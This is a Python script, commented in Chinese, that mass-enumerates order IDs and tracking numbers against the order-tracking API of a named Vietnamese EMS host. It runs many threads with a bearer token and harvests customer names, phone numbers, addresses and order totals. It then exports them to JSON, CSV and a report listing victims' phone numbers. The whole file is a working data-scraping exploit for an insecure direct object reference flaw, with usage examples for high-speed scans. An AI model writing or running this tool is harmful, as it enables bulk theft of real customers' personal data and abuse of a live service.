#!/usr/bin/env python3
"""
EMS Portal - 运单号/订单ID扫描器
通过订单追踪API批量获取订单数据
"""

import requests
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class TrackingScanner:
    def __init__(self, token):
        self.token = token
        self.base_url = "http://ws.ems.com.vn"
        self.headers = {"Authorization": f"Bearer {token}"}
        self.found_orders = []
        self.tested = 0
    
    def print_banner(self):
        print(f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       EMS Portal - 运单号扫描器                             ║
║       通过追踪API遍历订单                                    ║
╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}

{Colors.YELLOW}功能:{Colors.RESET}
  • 批量扫描订单ID
  • 遍历运单号
  • 多线程高速扫描
  • 自动导出结果

{Colors.YELLOW}API: /api/v1/orders/tracking/{{ID}}{Colors.RESET}
        """)
    
    def scan_order_id(self, order_id):
        """扫描单个订单ID"""
        try:
            r = requests.get(
                f"{self.base_url}/api/v1/orders/tracking/{order_id}",
                headers=self.headers,
                timeout=5
            )
            
            if r.status_code == 200:
                data = r.json()
                
                if data.get('code') == 'success':
                    order_data = data.get('data', {})
                    
                    result = {
                        'id': order_id,
                        'customer_name': order_data.get('customer_name', 'N/A'),
                        'phone': order_data.get('phone', 'N/A'),
                        'address': order_data.get('address', 'N/A'),
                        'status': order_data.get('status', 'N/A'),
                        'total': order_data.get('total', 0),
                        'created_at': order_data.get('created_at', 'N/A'),
                        'tracking_number': order_data.get('tracking_number', 'N/A'),
                        'full_data': order_data
                    }
                    
                    return result
        
        except Exception as e:
            pass
        
        return None
    
    def batch_scan_ids(self, start_id, count, workers=50):
        """批量扫描订单ID"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[开始扫描] 订单ID{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        print(f"范围: {start_id} - {start_id + count}")
        print(f"并发: {workers}")
        print(f"预计时间: {count / workers / 10:.1f} 分钟\n")
        
        start_time = time.time()
        
        order_ids = list(range(start_id, start_id + count))
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = {executor.submit(self.scan_order_id, oid): oid for oid in order_ids}
            
            for future in as_completed(futures):
                self.tested += 1
                result = future.result()
                
                if result:
                    self.found_orders.append(result)
                    
                    print(f"{Colors.GREEN}[+] {result['id']}: {result['customer_name']} | {result['phone']} | {result['total']:,} VND{Colors.RESET}")
                
                # 进度
                if self.tested % 100 == 0:
                    elapsed = time.time() - start_time
                    speed = self.tested / elapsed if elapsed > 0 else 0
                    eta = (count - self.tested) / speed if speed > 0 else 0
                    
                    print(f"{Colors.YELLOW}[进度] {self.tested}/{count} ({self.tested*100/count:.1f}%) | "
                          f"速度:{speed:.1f}/s | 已找到:{len(self.found_orders)} | "
                          f"ETA:{eta/60:.1f}分钟{Colors.RESET}")
        
        elapsed = time.time() - start_time
        
        print(f"\n{Colors.GREEN}[✓] 扫描完成!{Colors.RESET}")
        print(f"  测试: {self.tested}")
        print(f"  找到: {len(self.found_orders)}")
        print(f"  耗时: {elapsed:.1f}秒 ({self.tested/elapsed:.1f}/s)")
    
    def scan_tracking_numbers(self, pattern, count, workers=50):
        """扫描运单号"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[开始扫描] 运单号{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        print(f"格式: {pattern}")
        print(f"数量: {count}\n")
        
        # 生成运单号
        tracking_numbers = []
        
        if pattern == 'EM*VN':
            # 格式: EM + 9位数字 + VN
            for i in range(count):
                tracking_no = f"EM{i:09d}VN"
                tracking_numbers.append(tracking_no)
        
        elif pattern == 'VN*':
            # 格式: VN + 10位数字
            for i in range(count):
                tracking_no = f"VN{i:010d}"
                tracking_numbers.append(tracking_no)
        
        else:
            # 纯数字
            tracking_numbers = [str(i) for i in range(1000000, 1000000 + count)]
        
        print(f"[*] 生成 {len(tracking_numbers)} 个测试运单号")
        print(f"示例: {tracking_numbers[:5]}\n")
        
        # 批量扫描
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=workers) as executor:
            results = executor.map(self.scan_order_id, tracking_numbers)
            
            for i, result in enumerate(results):
                self.tested += 1
                
                if result:
                    self.found_orders.append(result)
                    print(f"{Colors.GREEN}[+] 找到: {result['id']} | {result['tracking_number']}{Colors.RESET}")
                
                if (i + 1) % 100 == 0:
                    elapsed = time.time() - start_time
                    speed = (i + 1) / elapsed
                    print(f"{Colors.YELLOW}[进度] {i+1}/{count} | 已找到: {len(self.found_orders)}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[✓] 扫描完成: 找到 {len(self.found_orders)} 个订单{Colors.RESET}")
    
    def export_results(self):
        """导出结果"""
        if not self.found_orders:
            print(f"\n{Colors.YELLOW}[!] 没有找到订单{Colors.RESET}")
            return
        
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}{Colors.BOLD}[导出结果]{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # 1. JSON导出
        json_file = f'tracking_scan_{timestamp}.json'
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(self.found_orders, f, indent=2, ensure_ascii=False)
        
        print(f"{Colors.GREEN}[+] JSON: {json_file}{Colors.RESET}")
        
        # 2. CSV导出
        csv_file = f'tracking_scan_{timestamp}.csv'
        import csv
        
        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'id', 'tracking_number', 'customer_name', 'phone',
                'address', 'total', 'status', 'created_at'
            ])
            writer.writeheader()
            
            for order in self.found_orders:
                writer.writerow({
                    'id': order['id'],
                    'tracking_number': order['tracking_number'],
                    'customer_name': order['customer_name'],
                    'phone': order['phone'],
                    'address': order['address'],
                    'total': order['total'],
                    'status': order['status'],
                    'created_at': order['created_at']
                })
        
        print(f"{Colors.GREEN}[+] CSV: {csv_file}{Colors.RESET}")
        
        # 3. 统计报告
        self.generate_report(timestamp)
    
    def generate_report(self, timestamp):
        """生成统计报告"""
        report_file = f'tracking_scan_report_{timestamp}.txt'
        
        # 统计
        phones = set(o['phone'] for o in self.found_orders if o.get('phone') and o['phone'] != 'N/A')
        total_amount = sum(int(o.get('total', 0)) for o in self.found_orders if o.get('total'))
        
        statuses = {}
        for order in self.found_orders:
            status = order.get('status', 'unknown')
            statuses[status] = statuses.get(status, 0) + 1
        
        report = f"""
╔══════════════════════════════════════════════════════════════╗
║           运单号扫描报告                                     ║
╚══════════════════════════════════════════════════════════════╝

生成时间: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

【扫描统计】
  • 测试数量: {self.tested}
  • 找到订单: {len(self.found_orders)}
  • 成功率: {len(self.found_orders)*100/self.tested if self.tested > 0 else 0:.2f}%

【数据统计】
  • 涉及用户: {len(phones)} 人
  • 订单总额: {total_amount:,} VND

【订单状态分布】
"""
        
        for status, count in sorted(statuses.items(), key=lambda x: x[1], reverse=True):
            report += f"  • {status}: {count}\n"
        
        report += f"""
【用户电话】
"""
        for phone in sorted(phones)[:50]:
            count = sum(1 for o in self.found_orders if o.get('phone') == phone)
            report += f"  • {phone} ({count} 个订单)\n"
        
        if len(phones) > 50:
            report += f"  ... 还有 {len(phones) - 50} 个用户\n"
        
        report += """
【订单样例】 (前10个)
"""
        for order in self.found_orders[:10]:
            report += f"""
  订单ID: {order['id']}
  运单号: {order['tracking_number']}
  客户: {order['customer_name']}
  电话: {order['phone']}
  金额: {order['total']} VND
  状态: {order['status']}
  ---
"""
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"{Colors.GREEN}[+] 报告: {report_file}{Colors.RESET}")
        
        # 打印总结
        print(f"\n{Colors.CYAN}统计总结:{Colors.RESET}")
        print(f"  订单数: {len(self.found_orders)}")
        print(f"  用户数: {len(phones)}")
        print(f"  总金额: {total_amount:,} VND")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description='EMS Portal运单号/订单ID扫描器',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:

1. 扫描订单ID (推荐):
   python3 tracking_scanner.py --token "YOUR_TOKEN" --mode id --start 1000000 --count 10000

2. 扫描运单号 (EM格式):
   python3 tracking_scanner.py --token "YOUR_TOKEN" --mode tracking --pattern "EM*VN" --count 10000

3. 高速扫描:
   python3 tracking_scanner.py --token "YOUR_TOKEN" --mode id --start 1000000 --count 100000 --workers 200

输出:
  • tracking_scan_*.json - JSON数据
  • tracking_scan_*.csv  - CSV表格
  • tracking_scan_report_*.txt - 统计报告
        '''
    )
    
    parser.add_argument('--token', required=True, help='Bearer Token')
    parser.add_argument('--mode', choices=['id', 'tracking'], default='id',
                       help='扫描模式: id=订单ID, tracking=运单号')
    parser.add_argument('--start', type=int, default=1000000,
                       help='起始订单ID (id模式)')
    parser.add_argument('--count', type=int, default=1000,
                       help='扫描数量')
    parser.add_argument('--pattern', default='EM*VN',
                       help='运单号格式 (tracking模式): EM*VN, VN*, number')
    parser.add_argument('--workers', type=int, default=50,
                       help='并发线程数 (默认:50)')
    
    args = parser.parse_args()
    
    scanner = TrackingScanner(args.token)
    scanner.print_banner()
    
    if args.mode == 'id':
        scanner.batch_scan_ids(args.start, args.count, args.workers)
    else:
        scanner.scan_tracking_numbers(args.pattern, args.count, args.workers)
    
    scanner.export_results()
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}[完成] 所有数据已导出{Colors.RESET}\n")

if __name__ == '__main__':
    main()
